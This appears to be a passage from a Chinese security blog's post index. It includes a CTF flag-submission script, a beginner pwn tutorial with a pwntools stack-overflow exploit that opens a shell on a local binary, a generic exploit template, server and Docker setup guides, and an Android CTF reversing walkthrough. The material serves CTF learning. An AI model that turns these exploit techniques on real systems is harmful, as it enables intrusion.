&#123;&#x27;Cookie&#x27;:cookie,&#x27;CSRF-Token&#x27;:csrf_token,&#x27;Content-Type&#x27;:&#x27;application/json&#x27;&#125;\t\t\t\tres = requests.post(url,data=json_flag,headers=header,timeout=1)\t\t\t\tli(res.text)\t\t\texcept:\t\t\t\tli(&#x27;connect fail!&#x27;)\t\t\t\tcontinuewhile True:\tsubmit()\ttime.sleep(sleep_time)\n\n该脚本从.&#x2F;flags文件中读取flag, 依次提交至平台\n","categories":["security"],"tags":["awd"]},{"title":"pwn for beginner","url":"/2020/09/12/security/ctf/pwn/pwn-for-beginner/","content":"二进制pwn方向入门0x0 What is the pwn?​\tpwn是一个黑客语法的俚语词 ，是指攻破设备或者系统。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵了 (百度百科)\n​\tctf比赛,想必你已经了解过了,基本方向就分为 web, pwn, reverse, misc, crypto,  android, blockchain， 但主要方向为两个web安全和二进制安全, 那么pwn呢就属于二进制安全的一个分支, pwn的话入门确实相比其他方向的难度要高一点, 基本上ctf的各大比赛pwn与web都占主导位置, ctf的awd模式只有web和pwn, 所以pwn在ctf领域, 是个很不错的选择方向。pwn是二进制漏洞挖掘与利用, 那么在实际中,  各大服务器软件中经常曝出缓冲区溢出漏洞, 有时候ctf比赛中还会直接拿最近曝的cve来出题。pwn的漏洞利用技巧与实际中的二进制安全密不可分。那么该怎么入门pwn呢, 接下来我来为你即将入门的pwn手详细讲解。\n0x1 pwn入门学习准备linux学习​\t先学会使用虚拟机装一下linux系统, 推荐先试试装一下 ubuntu16\n​\t了解linux的程序装载和执行\n​\t了解linux的elf格式\n​\t了解一下程序的堆栈结构\nc &#x2F; c++语言学习​\t 基本语法的与简单正向编写\npython语言学习​\t基本语法就行, 为以后写exp\n汇编语言学习​\t学一下简单的x86_64汇编指令, 读懂一些简单的就行\n简单逆向​\t熟悉使用ida软件逆一下简单的程序, 可以先逆一下linux的elf程序\n0x2 工具篇工欲善其事,必先利其器。以下工具是pwn需要用的.\nida : 反汇编绝佳利器, 以后想为程序打patch, 也可以使用它\npwntools: 用于在python下写pwn利用脚本的库\npwndbg: 基于python与gdb更直观的调试工具, 方便调试程序\nROPgadget: 查找偏移的利器\n以上是pwn必备的工具.\n下面是入门后的工具:\none_gadget: 获取libc的one gadget, 入门之后再了解\nseccomp: 沙箱检测工具, 入门之后再了解\npwn docker: 已经搭建好的pwn docker镜像, 不用手动搭建pwn环境, 入门之后再换环境吧\n0x3 经典常见技巧学习stack​\tbasic stack overflow\n​\tleak cannary\n​\tret2text\n​\tret2shellcode\n​\tret2syscall\n​\tret2libc\n​\trop\n​\trow\n​\tret2dl-resolve\n…\nfmt​\tleak (libc , stack, elf)\n​\tleak anything anywhere\n​\tmodify anything anywhere\n​\tuse it no stack\n…\nheapbasic heap overflow\nfastbin attack\nunlink\nhouse of einherjar\noff by one\noff by null\nunsorted bin attack\nuaf (libc.so.2.27 and libc.so.2.23)\nhouse of roman\nhouse of orange\nhouse of *…\n…\nohterspython sandbox escape\niofile attack\nhijack hook (malloc_hook, realloc_hook, free_hook….)\nhijack elf got table\nhijack ld got table\nleak libc by print got\nleak libc by modify IO_2_1_stdout struct\n….\n0x4 入门实例这里默认你已经学会了基本的入门准备, pwn环境搭建我也不必多说了吧,百度或者google一下,看别人是怎么搭建pwn环境的。 那一下内容为最简单的stack overflow, 先了解一下stack overflow的劫持实验。\n#include &lt;stdio.h&gt;void vul() &#123;\tchar arr[16];\tgets(arr);&#125;int main()&#123;\tvul();\tprintf(&quot;no error\\n&quot;);\treturn 0;&#125;\n\n保存为a.c 尝试编译一下\ngcc a.c -o pwn./pwnasdfasdfasdfadsjfasdkjfsd*** stack smashing detected ***: terminatedfAborted (core dumped)\n\n执行输入超过15个字符就会发现, 不会执行到printf(“no error\\n”)函数, 这就是所谓的堆栈溢出漏洞, 那么有时候开发不小心的时候就会造成这种漏洞.我再来个例子。\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void vul() &#123;        char arr[16];        gets(arr);&#125;void target() &#123;        system(&quot;sh&quot;);&#125;int main()&#123;        vul();        printf(&quot;no error\\n&quot;);        return 0;&#125;\n\npwn的最终目标都是能够拥有控制权,也就是获得shell, 若我们能够通过输入劫持到target()函数, 那么我们就成功利用了该漏洞劫持程序流程到我们想要执行的代码部分, 也就是执行system函数获得shell.\n编译gcc --no-stack-protector -no-pie a.c -o pwn./pwn\n\n使用python 写一下exp试试, 如下:\n#! /usr/bin/python3from pwn import *sh = process(&#x27;./pwn&#x27;) # 在本地打开程序p = b&#x27;A&#x27; * 15  # 构造payload为15个b&#x27;A&#x27;sh.sendline(p) # 发送payloadsh.interactive() # 与程序进行交互\n\n保存为a.py, 执行\npython3 a.py \n\n执行结果\n[logan@arch ~]$ [+] Starting local process &#x27;./pwn&#x27;: pid 44257[*] Switching to interactive mode[*] Process &#x27;./pwn&#x27; stopped with exit code 0 (pid 44257)no error[*] Got EOF while reading in interactive\n\n可以发现, 程序正常退出, 既然存在堆栈溢出漏洞, 我们要如何劫持程序流程呢, 那我们只有我们修改寄存器rip就可以实现任意地址执行了,那么就要的了解一下堆栈结构, 当程序调用一个新的函数时, 将会将当前的rip执行到的地址压入堆栈储存起来, 方便函数执行完后在回到原来的执行位置,若我们可以修改这个值, 在执行完函数后就实现了修改rip, 指令就是ret, ret指令相当与pop rip.\nrsp---&gt;+-----------------+       |      buffer     |       +-----------------+       |      ......     |       +-----------------+       |      buffer     |       +-----------------+       |   last func rbp |rbp---&gt;+-----------------+       |     ret addr    |       +-----------------+\n\n我们用gdb来调试一下\npwndbg stack 00:0000│ rax r8 rsp**  0x7fffffffe5a0 ◂— 0x41414141 /* &#x27;AAAA&#x27; */ 01:0008│       0x7fffffffe5a8 —▸ 0x401060 (_start) ◂— endbr64  02:0010│ rbp     0x7fffffffe5b0 —▸ 0x7fffffffe5c0 —▸ 0x4011a0 (__libc_csu_init) ◂— endbr64  03:0018│       0x7fffffffe5b8 —▸ 0x401183 (main+14) ◂— lea   rdi, [rip + 0xe7d]\n\n上面我只输入了4个’A’, 若能够构造一个payload覆盖到rbp + 8处, 就可以实现劫持了, 输入24个’A’, 为啥是24呢, 数组长度为16, 然而rbp地址空间长度为8, 要溢出到ret地址, 就事先就输入24个字符。然后再输入8个’B覆盖ret 地址试试, 结果如下:\n RIP  0x401161 (vul+27) ◂— ret    ─────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────   0x401152 &lt;vul+12&gt;    mov    rdi, rax   0x401155 &lt;vul+15&gt;    mov    eax, 0   0x40115a &lt;vul+20&gt;    call   gets@plt &lt;0x401050&gt;    0x40115f &lt;vul+25&gt;    nop       0x401160 &lt;vul+26&gt;    leave   ► 0x401161 &lt;vul+27&gt;    ret    &lt;0x4242424242424242&gt;\n\n可以发现, 当执行ret指令时, 我们已经吧rip改成了0x4242424242424242\n而0x42是字符’B’的储存值,若我们想要实现修改为0x01或者其他不可打印的字符, 那么手动是没法输入的, 那只能借用脚本,  将我们第一个使用的exp修改一下, 如下\n#! /usr/bin/python3from pwn import *sh = process(&#x27;./pwn&#x27;) # 在本地打开程序p = b&#x27;A&#x27; * 24  # 构造payloadp += b&#x27;\\x12\\x34\\x56\\x78&#x27; # 地址中储存高位在左, 内存中储存会为0x78563412gdb.attach(sh)  # gdb调试sh.sendline(p) # 发送payloadsh.interactive() # 与程序进行交互\n\n我们执行看看, 是否rip 修改为0x78563412呢？\n RBP  0x4141414141414141 (&#x27;AAAAAAAA&#x27;)  RSP  0x7fff64449e20 ◂— 0x0  RIP  0x78563412 ─────────────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────────── Invalid address 0x78563412\n\n果真修改为我们预期的结果\n我们使用objdump指令获取target函数的地址\nobjdump -S pwn | grep target0000000000401162 &lt;target&gt;:\n\n那么如果我们将rip修改为0x401162, 即可实现跳转到目标函数\n修改exp如下:\n#! /usr/bin/python3from pwn import *sh = process(&#x27;./pwn&#x27;) # 在本地打开程序p = b&#x27;A&#x27; * 24  # 构造payloadp += b&#x27;\\x62\\x11\\x40\\x00\\x00\\x00\\x00\\x00&#x27; # 0x401162gdb.attach(sh)  # gdb调试sh.sendline(p) # 发送payloadsh.interactive() # 与程序进行交互\n\n\n\n调试运行*RIP  0x401162 (target) ◂— push   rbp─────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────   0x40115f &lt;vul+25&gt;       nop       0x401160 &lt;vul+26&gt;       leave     0x401161 &lt;vul+27&gt;       ret      ► 0x401162 &lt;target&gt;       push   rbp   0x401163 &lt;target+1&gt;     mov    rbp, rsp   0x401166 &lt;target+4&gt;     lea    rdi, [rip + 0xe97]   0x40116d &lt;target+11&gt;    call   system@plt &lt;system@plt&gt;\n\n看到现在就运行到了target函数中, 那么就成功劫持了程序流程.好了最终exp如下:\n#! /usr/bin/python3from pwn import *sh = process(&#x27;./pwn&#x27;) # 在本地打开程序p = b&#x27;A&#x27; * 24  # 构造payloadp += p64(0x401162) # target函数地址# p64函数会将数值转化为8字节的字符串&#x27;\\x62\\x11\\x40\\x00\\x00\\x00\\x00\\x00&#x27;sh.sendline(p) # 发送payloadsh.interactive() # 与程序进行交互\n\n运行结果:[logan@arch share]$ python a.py [+] Starting local process &#x27;./pwn&#x27;: pid 45513[*] Switching to interactive mode$ dateSat 12 Sep 2020 09:25:17 PM CST\n\n\n\n0x5 常用网站推荐若以上你能正确调试与利用成功,  那你已经开始入门了, 你需要学习更多的知识了.以下网站是我及其推荐的.\nctf-wiki : pwn的详细学习路线\n攻防世界  : 从入门到高手的刷题网站与国内比赛平台\nbuuctf : 刷不完的pwn题网站\nctf-hub : 时刻关注各个赛事\nctf-time: 时刻关注国外赛事\nlibc database: 查询libc版本网站\ni0gan :  本人我的blog, 多多关注其他人的博客, 可以学到很多有用的知识 ^_^\n","categories":["ctf"],"tags":["pwn"]},{"title":"在自己的服务器上搭建hexo blog","url":"/2020/09/11/env/blog/setup-hexo-blog-on-server/","content":"在自己的服务器上搭建hexo blog在本地生成ssh秘钥ssh-keygen -t rsa -b 4096 -C “&#x69;&#x30;&#x67;&#x61;&#110;&#64;&#x71;&#x71;&#46;&#99;&#111;&#x6d;“\n一路回车，生成的公钥保存在 ~&#x2F;.ssh&#x2F;id_rsa.pub\n本教程基于会在github上搭建移植到自己的服务器中\n必备:\nnginx\ngit\nnodejs\n添加用户useradd -m gitpasswd git\n\nvim &#x2F;etc&#x2F;sudoers\n找到root ALL&#x3D;(ALL) ALL，在它下方加入一行\ngit ALL=(ALL) ALL\n\n\n\n给git用户添加ssh密钥su - gitmkdir -p ~/.sshtouch ~/.ssh/authorized_keyschmod 600 ~/.ssh/authorized_keyschmod 700 ~/.sshvim ~/.ssh/authorized_keys    #将本地生成ssh公钥密钥(~/.ssh/id_rsa.pub) 粘贴进去\n\n\n\n创建git仓库并使用git-hooks实现自动部署sudo mkdir -p /var/repo    #新建目录，这是git仓库的位置sudo mkdir pp /var/www/hexocd /var/repo  #转到git仓库的文件夹sudo git init --bare blog.git #创建一个名叫blog的仓库sudo vim /var/repo/blog.git/hooks/post-update\n\npost-update的内如如下：\n#!/bin/bashgit --work-tree=/var/www/hexo --git-dir=/var/repo/blog.git checkout -f\n\n给post-update授权：\ncd /var/repo/blog.git/hooks/sudo chown -R git:git /var/repo/sudo chown -R git:git /var/www/hexosudo chmod +x post-update  #赋予其可执行权限\n\n\n\n配置nginxcd /etc/nginx/conf.dsudo vim blog.conf\n\nblog.conf的内如如下：\nserver &#123;    listen    80 default_server;    listen    [::] default_server;    server_name    i0gan.pwnsky.com;    root    /var/www/hexo;&#125;\n\n检查Nginx语法并重载nginx：\nnginx -tnginx -s reload\n\n\n\n修改git用户的默认shell环境vim /etc/passwd#修改最后一行#将/bin/bash修改为/usr/bin/git-shell\n\n\n\n本地hexo 配置vim _config.yml# 找到deploy配置部分# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy:  type: git  repo: git@xxx.xx.xxx.xxx:/var/repo/blog.git # IP填写自己服务器的IP即可  branch: master\n","categories":["env"],"tags":["hexo"]},{"title":"pwn docker env build","url":"/2020/09/11/security/ctf/pwn/pwn-docker-env/","content":"Pwn Docker环境搭建之前一直都是在ubuntu14 ~ ubuntu18虚拟机中进行调试, 若不是常见的libc就比较麻烦,而且虚拟机安装后比较占磁盘还有管理不太方便, 环境有时候崩溃的话,就比较再次难以搭建, 为了解决以上问题, pwn docker完美解决, 且提供了大量ctf pwn工具, 以python3来进行脚本编写, 更加符合目前的pwn演变趋势….\n包含的软件\npwntools —— CTF framework and exploit development library\ngdb-peda —— Python Exploit Development Assistance for GDB\nPwngdb —— GDB for pwn\nROPgadget —— facilitate ROP exploitation tool\nroputils —— A Return-oriented Programming toolkit\nlinux_server[x64] —— IDA 6.8 debug server for linux\ntmux —— a terminal multiplexer\nltrace —— trace library function call\nstrace —— trace system call\n\ngithubhttps://github.com/shenyuan123/pwndocker\n拉取镜像Docker hub地址：https://hub.docker.com/r/skysider/pwndocker/\ndocker pull skysider/pwndocker\n\n\n\n创建docker 网络sudo docker network create-subnet=192.168.222.0/24docker_net\n\n\n\n运行docker run -it --name=pwn --net docker_net skysider/pwndocker bash\n\n\n\n\n\n编写docker pwn 启动管理脚本#! /bin/bash# author: i0ganif [[ $1 == &#x27;init&#x27; ]];then\tsudo docker run --network=host -d --name=pwn -v /home/logan/share:/ctf/work skysider/pwndockerelif [[ $1 == &#x27;exec&#x27; ]];then\tsudo docker exec -it pwn bashelif [[ $1 == &#x27;start&#x27; ]];then\tsudo docker start pwnelif [[ $1 == &#x27;stop&#x27; ]];then\tsudo docker stop pwnelse\techo &quot;nothing to do&quot;fi\n\n\n\n配置源备份源\ncp /etc/apt/sources.list /etc/apt/sources.list.bk\n\n将一下内容覆盖到&#x2F;etc&#x2F;apt&#x2F;sources.list中\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse\n\n更新list\napt update\n\n\n\n\n\n安装 tmuxapt install tmux\n\n会话外操作​\t tmux new -s  在会话外创建一个新的会话​\ttmux ls   在会话外获取会话列表​\ttmux a（attach） -t    在会话外进入会话，不带名字进入第一个会话​\ttmux kill-session -t   在会话外删除会话\n上面的操作是在普通命令行下操作的，所以不用按前缀键。下面的都是在tmux中操作的，所以需要按前缀键，默认是ctrl-b；在tmux中，输入冒号是开启命令行\n基本操作​\t?\t列出所有快捷键；按q返回​\td\t脱离当前会话,可暂时返回Shell界面，输入tmux attach能够重新进入之前会话​\ts\t选择并切换会话；在同时开启了多个会话时使用​\tD\t选择要脱离的会话；在同时开启了多个会话时使用​\t:\t进入命令行模式；此时可输入支持的命令，例如kill-server所有tmux会话​\t[\t复制模式，光标移动到复制内容位置，空格键开始，方向键选择复制，回车确认，q&#x2F;Esc退出​\t]\t进入粘贴模式，粘贴之前复制的内容，按q&#x2F;Esc退出​\t~\t列出提示信息缓存；其中包含了之前tmux返回的各种提示信息​\tt\t显示当前的时间 \n会话操作:new -s     进入会话后创建新的会话     s   列出会话，进行选择     :kill-session    删除当前会话     :kill-server     删除所有会话\n窗口操作​\tc\t创建新窗口​\t&amp;\t关闭当前窗口​\t数字键\t切换到指定窗口​\tp\t切换至上一窗口​\tn\t切换至下一窗口​\tl\t前后窗口间互相切换​\tw\t通过窗口列表切换窗口​\t,\t重命名当前窗口，便于识别​\t.\t修改当前窗口编号，相当于重新排序​\tf\t在所有窗口中查找关键词，便于窗口多了切换\n面板操作​\t“\t将当前面板上下分屏​\t%\t将当前面板左右分屏​\tx\t关闭当前分屏​\tz\ttmux 1.8新特性，最大化当前所在面板，重复一遍返回​\t!\t将当前面板置于新窗口,即新建一个窗口,其中仅包含当前面板​\tCtrl+方向键\t以1个单元格为单位移动边缘以调整当前面板大小​\tAlt+方向键\t以5个单元格为单位移动边缘以调整当前面板大小​\t空格键\t可以在默认面板布局中切换，试试就知道了​\tq\t显示面板编号​\to\t选择当前窗口中下一个面板​\t方向键\t移动光标选择对应面板​\t{\t向前置换当前面板​\t}\t向后置换当前面板​\tAlt+o\t逆时针旋转当前窗口的面板​\tCtrl+o\t顺时针旋转当前窗口的面板\nlibc searcher 使用.&#x2F;get 下载get工具, 若已下载请直接跳过\n.&#x2F;add usr&#x2F;lib&#x2F;libc-2.21-so 向数据库中添加自定义 libc\n.&#x2F;find __libc_start_main xxx 这里输入你要查找的函数的真实地址的后三位\n.&#x2F;dump xxx 转储一些有用的偏移量，给出一个 libc id, 这里输入第三步得到的结果中id后的libc库\n这样你就可以得到需要的文件中的偏移地址了\n网页libc searcher\nexp预备脚本#!/usr/bin/env python3#-*- coding:utf-8 -*-# author: i0gan# env: pwndocker [skysider/pwndocker (v: 2020/09/09)]from pwn import *import oscontext.log_level=&#x27;debug&#x27;elf_path  = &#x27;pwn&#x27;arch = &#x27;64&#x27;libc_v = &#x27;2.27&#x27;ld_path   = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/ld-linux-x86-64.so.2&#x27;libs_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib&#x27;libc_path = &#x27;/glibc/&#x27; + libc_v + &#x27;/&#x27; + arch + &#x27;/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# change ld path change_ld_cmd = &#x27;patchelf  --set-interpreter &#x27; + ld_path +&#x27; &#x27; + elf_pathos.system(change_ld_cmd)# remote server ip and portserver_ip = &quot;0.0.0.0&quot;server_port = 0# if local debugLOCAL = 1LIBC  = 0r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tdef finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path, &quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path&#125; )\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\n\n\npwn docker 环境参考\n","categories":["ctf"],"tags":["pwn"]},{"title":"linux文件字符串批量查找以及替换","url":"/2020/09/10/env/linux/linux%E6%96%87%E4%BB%B6%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%89%B9%E9%87%8F%E6%9F%A5%E6%89%BE%E4%BB%A5%E5%8F%8A%E6%9B%BF%E6%8D%A2/","content":"linux文件字符串批量查找以及替换有时候要找一些字符串，但是又不知道在哪个文件，只记得一些字符串\n查找目录下的所有文件中是否含有某个字符串\nfind .|xargs grep -ri &quot;SMS_ISSEND&quot;\n查找目录下的所有文件中是否含有某个字符串,并且只打印出文件名\nfind .|xargs grep -ri &quot;SMS_ISSEND&quot; -l\n批量替换\nsed -i &quot;s/oldstring/newstring/g&quot; `grep oldstring -rl yourdir`\n\n","categories":["env"],"tags":["linux"]},{"title":"pacman 命令参数","url":"/2020/09/09/env/linux/myarch/pacman/","content":"pacman  命令参数更新pacman -Sy更新软件库(类似apt-get update)pacman -Syy强制更新软件库pacman -Su更新软件(类似apt-get upgrade)pacman -Syu更新软件库并更新软件pacman -Syyu强制更新软件库并更新软件查询pacman -Ss [name]查询[name]软件pacman -Q列出所有本地已安装的软件包括系统软件pacman -Qe列出所有本地自己已安装的软件详细信息pacman -Qeq列出所有本地自己已安装的软件(只有软件名，没有版本号)pacman -Qs [name]查询已安装的[name]软件信息pacman -Qdt查询没有被任何软件依赖的依赖软件详细信息(没有任何作用)pacman -Qdtq查询没有被任何软件依赖的依赖软件(只有软件名)安装pacman -S [name]安装[name]软件清除缓存pacman -Sc清除安装包缓存(一般在&#x2F;var&#x2F;cache&#x2F;pacman&#x2F;pkg&#x2F;下)卸载pacman -R [name]卸载[name]软件pacman -Rs [name]卸载[name]软件以及依赖软件pacman -Rns [name]卸载[name]软件以及依赖软件以及全局配置文件pacman -R $(pacman -Qdtq)卸载所有没有被任何软件依赖的依赖软件\n","categories":["env"],"tags":["linux"]},{"title":"Debian 安装 docker","url":"/2020/09/09/env/docker/debian_docker/","content":"Debian 安装 docker卸载旧版sudo apt-get remove docker docker-engine docker.io containerd runc\n\n设置仓库apt update\n\n\n\n\n安装 apt 依赖包用于通过 HTTPS 来获取仓库\nsudo apt-get install \\   apt-transport-https \\   ca-certificates \\   curl \\   gnupg2 \\   software-properties-common\n\n\n\n添加 Docker 的官方 GPG 密钥curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -\n\n9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 通过搜索指纹的后8个字符，验证您现在是否拥有带有指纹的密钥\n查看密匙 (9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 通过搜索指纹的后8个字符，验证您现在是否拥有带有指纹的密钥)\nsudo apt-key fingerprint 0EBFCD88\n\n输出:\npub   4096R/0EBFCD88 2017-02-22      Key fingerprint = 9DC8 5822 9FC7 DD38 854A  E2D8 8D81 803C 0EBF CD88uid                  Docker Release (CE deb) &lt;docker@docker.com&gt;sub   4096R/F273FCD8 2017-02-22\n\n使用以下指令设置稳定版仓库sudo add-apt-repository \\  &quot;deb [arch=amd64] https://download.docker.com/linux/debian \\  $(lsb_release -cs) \\  stable&quot;\n\n安装 Docker Engine-Communitysudo apt update\n\n安装最新版本的 Docker Engine-Community 和 containerd ，或者转到下一步安装特定版本：\nsudo apt-get install docker-ce docker-ce-cli containerd.io\n\n\n要安装特定版本的 Docker Engine-Community 请在仓库中列出可用版本,然后选择一种安装,列出您的仓库中可用的版本\nsudo apt-cache madison docker-ce\n\n使用第二列中的版本字符串安装特定版本，例如 5:18.09.13-0debian-stretch\nsudo apt-get install docker-ce=&lt;VERSION_STRING&gt; docker-ce-cli=&lt;VERSION_STRING&gt; containerd.io\n\n\n\n测试 Docker 是否安装成功输入以下指令，打印出以下信息则安装成功：\nsudo docker run hello-world\n\n\n\n管理配置用户默认情况下，docker 命令会使用 Unix socket 与 Docker 引擎通讯, 而只有 root 用户和 docker 组的用户才可以访问 \nDocker 引擎的 Unix socket 出于安全考虑，一般 Linux 系统上不会直接使用 root 用户 因此，可将需要使用 docker 的用户加入 docker 用户组\nusermod -aG docker $&#123;USER&#125;\n\n\n\n应用新的组成员身份su - $&#123;USER&#125;\n\n配置国内镜像鉴于国内网络问题，后续拉取 Docker 镜像十分缓慢，我们可以需要配置加速器来解决，我使用的是网易的镜像地址：http://hub-mirror.c.163.com新版的 Docker 使用 &#x2F;etc&#x2F;docker&#x2F;daemon.json来配置 Daemon请在该配置文件中加入（没有该文件的话，请先建一个）\n&#123;\t&quot;registry-mirrors&quot;: [\t\t&quot;http://hub-mirror.c.163.com&quot;\t]&#125;\n\n重启docker\nsudo systemctl restart docker","categories":["env"],"tags":["docker"]},{"title":"Android 逆向入门","url":"/2020/09/07/security/reverse/android/android-revese-0/","content":"Android Re 入门必备工具:IDA : 反编译.so文件\nAndroidKiller: 反编译apk文件及再次编译为apk\njd-gui  : 将.jar文件反编译为java代码\ndex2jar: 反编译.dex文件\napktool: 能够反编译及回编译apk\n夜神模拟器: 运行apk文件\n例题 1 [easy-so]下载\n来源:攻防世界\n使用夜神模拟器运行该apk文件, 发现需要输入flag\nzip解压apk文件, 用 dex2jar反编译 classes.dex文件得到classes-dex2jar.jar,\nd2j-dex2jar.bat classes.dex\n\n 再用jd-gui打开classes-dex2jar.jar反编译为java代码.\npublic class MainActivity extends AppCompatActivity &#123;  protected void onCreate(Bundle paramBundle) &#123;    super.onCreate(paramBundle);    setContentView(2131296283);    ((Button)findViewById(2131165218)).setOnClickListener(new View.OnClickListener() &#123;          public void onClick(View param1View) &#123;            if (cyberpeace.CheckString(((EditText)MainActivity.this.findViewById(2131165233)).getText().toString()) == 1) &#123;              Toast.makeText((Context)MainActivity.this, &quot;, 1).show();              return;            &#125;             Toast.makeText((Context)MainActivity.this, &quot;, 1).show();          &#125;        &#125;);  &#125;&#125;\n\n在这里可以发现, cyberpeace加载了’cyberpeace’动态库, CheckString函数是native层的, 这个函数的实现就在libcyberpeace.so文件中\npackage com.testjava.jack.pingan2;public class cyberpeace &#123;  static &#123;    System.loadLibrary(&quot;cyberpeace&quot;);  &#125;    public static native int CheckString(String paramString);&#125;\n\n使用ida打开lib&#x2F;x86&#x2F;libcyberpeace.so文件, 找到 _BOOL4 __cdecl Java_com_testjava_jack_pingan2_cyberpeace_CheckString(int a1, int a2, int a3)函数, 该函数实现如下:\n_BOOL4 __cdecl Java_com_testjava_jack_pingan2_cyberpeace_CheckString(int a1, int a2, int a3)&#123;  const char *get_str; // ST1C_4  size_t len; // edi  char *str; // esi  size_t i; // edi  char v7; // al  char v8; // al  size_t v9; // edi  char v10; // al  get_str = (const char *)(*(int (__cdecl **)(int, int, _DWORD))(*(_DWORD *)a1 + 676))(a1, a3, 0); // 从java层获取所输入的字符串  len = strlen(get_str);  str = (char *)malloc(len + 1);  memset(&amp;str[len], 0, len != -1);  memcpy(str, get_str, len);  if ( strlen(str) &gt;= 2 ) // 加密1  &#123;    i = 0;    do    &#123;      v7 = str[i];      str[i] = str[i + 16];      str[i++ + 16] = v7;    &#125;    while ( i &lt; strlen(str) &gt;&gt; 1 );  &#125;  // 加密2  v8 = *str;  if ( *str )  &#123;    *str = str[1];    str[1] = v8;    if ( strlen(str) &gt;= 3 )    &#123;      v9 = 2;      do      &#123;        v10 = str[v9];        str[v9] = str[v9 + 1];        str[v9 + 1] = v10;        v9 += 2;      &#125;      while ( v9 &lt; strlen(str) );    &#125;  &#125;  return strcmp(str, &quot;f72c5a36569418a20907b55be5bf95ad&quot;) == 0; // 与字符串作比较&#125;\n\n从以上发现, 对我们所输入的字符串进行了加密, 然后再与f72c5a36569418a20907b55be5bf95ad进行比较. 现在只需逆一下以上代码即可得到flag, exp代码如下\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(void) &#123;\tchar str[] = &quot;f72c5a36569418a20907b55be5bf95ad&quot;;\tint i, v7, v8, v9, v10;\tv8 = *str;\tif ( *str ) &#123;\t\t*str = str[1];\t\tstr[1] = v8;\t\tif ( strlen(str) &gt;= 3 ) &#123;      \t\tv9 = 2;      \t\tdo &#123;        \t\tv10 = str[v9];        \t\tstr[v9] = str[v9 + 1];        \t\tstr[v9 + 1] = v10;        \t\tv9 += 2;      \t\t&#125; while ( v9 &lt; strlen(str) );\t\t&#125;\t&#125;\t\t// 交换 \tif ( strlen(str) &gt;= 2 )\t&#123;   \t i = 0;    \tdo &#123;      \t\tv7 = str[i];      \t\tstr[i] = str[i + 16];     \t\tstr[i++ + 16] = v7;   \t \t&#125; while ( i &lt; strlen(str) &gt;&gt; 1 );\t&#125;\tprintf(&quot;%s&quot;, str);  \treturn 0;&#125;\n\n运行以上代码即可获取flag\n例题 2 [app2]下载\n来源:攻防世界\n对输入的账号和密码在SecondActivity类中进行加密判断, 而加密调用了native层的加密函数\nprotected void onCreate(Bundle paramBundle) &#123;    super.onCreate(paramBundle);    setContentView(2130903041);    Intent intent = getIntent();    String str1 = intent.getStringExtra(&quot;ili&quot;);    String str2 = intent.getStringExtra(&quot;lil&quot;);    if (Encryto.doRawData(this, str1 + str2).equals(&quot;VEIzd/V2UPYNdn/bxH3Xig==&quot;)) &#123;      intent.setAction(&quot;android.test.action.MoniterInstallService&quot;);      intent.setClass((Context)this, MoniterInstallService.class);      intent.putExtra(&quot;company&quot;, &quot;tencent&quot;);      intent.putExtra(&quot;name&quot;, &quot;hacker&quot;);      intent.putExtra(&quot;age&quot;, 18);      startActivity(intent);      startService(intent);    &#125;     SharedPreferences.Editor editor = getSharedPreferences(&quot;test&quot;, 0).edit();    editor.putString(&quot;ilil&quot;, str1);    editor.putString(&quot;lili&quot;, str2);    editor.commit();  &#125;\n\nIDA反编译doRawData函数, 因为a为对象, 选择a按下y 键 然后输入 JNIEnv*就可以显示对象的函数调用, 如下\nint __cdecl doRawData(JNIEnv *a1, int a2, int a3, int a4)&#123;  char *v4; // esi  const char *v5; // ST10_4  int result; // eax  char *v7; // esi  jstring (*v8)(JNIEnv *, const jchar *, jsize); // ST10_4  size_t v9; // eax  int v10; // [esp+4h] [ebp-28h]  int v11; // [esp+8h] [ebp-24h]  int v12; // [esp+Ch] [ebp-20h]  int v13; // [esp+10h] [ebp-1Ch]  char v14; // [esp+14h] [ebp-18h]  unsigned int v15; // [esp+18h] [ebp-14h]  v15 = __readgsdword(0x14u);  if ( checkSignature((int)a1, a2, a3) == 1 )  &#123;    v14 = 0;    v13 = 